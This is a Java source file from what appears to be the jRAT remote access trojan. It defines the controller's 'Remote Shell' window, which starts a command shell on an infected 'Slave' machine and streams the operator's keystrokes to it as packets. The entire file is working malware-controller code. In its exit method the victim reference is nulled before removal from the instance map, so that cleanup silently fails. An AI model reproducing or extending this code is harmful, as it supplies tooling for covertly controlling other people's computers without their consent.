package jrat.controller.ui.frames;

import com.redpois0n.terminal.InputListener;
import com.redpois0n.terminal.JTerminal;
import jrat.controller.Slave;
import jrat.controller.packets.outgoing.Packet22RemoteShellTyped;
import jrat.controller.packets.outgoing.Packet23RemoteShellStart;
import jrat.controller.packets.outgoing.Packet24RemoteShellStop;

import javax.swing.*;
import java.awt.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.HashMap;
import java.util.Map;

@SuppressWarnings("serial")
public class FrameRemoteShell extends BaseFrame {

	public static final Map<Slave, FrameRemoteShell> INSTANCES = new HashMap<Slave, FrameRemoteShell>();
	
	private JTerminal terminal;
	private JScrollPane scrollPane;

	public FrameRemoteShell(Slave s) {
		super(s);
		INSTANCES.put(slave, this);
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				exit();
			}
		});
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteShell.class.getResource("/terminal.png")));
		setTitle("Remote Shell");
		setDefaultCloseOperation(DISPOSE_ON_CLOSE);
		setBounds(100, 100, 499, 302);

		scrollPane = new JScrollPane();
		terminal = new JTerminal();
		scrollPane.setViewportView(terminal);

		terminal.addInputListener(new InputListener() {
			@Override
			public void processCommand(JTerminal terminal, char c) {
                send(c);
			}
			
			@Override
			public void onTerminate(JTerminal terminal) {
				slave.addToSendQueue(new Packet24RemoteShellStop());
				slave.addToSendQueue(new Packet23RemoteShellStart());
			}
		});
		
		add(scrollPane, BorderLayout.CENTER);

		addKeyListener(terminal.getKeyListener());
		setSize(675, 300);
		
		slave.addToSendQueue(new Packet23RemoteShellStart());
	}
	
	private void send(char c) {
        slave.addToSendQueue(new Packet22RemoteShellTyped(c));
	}
	
	public JTerminal getTerminal() {
		return terminal;
	}

	public void exit() {
		slave.addToSendQueue(new Packet24RemoteShellStop());
		slave = null;
		INSTANCES.remove(slave);
	}
}
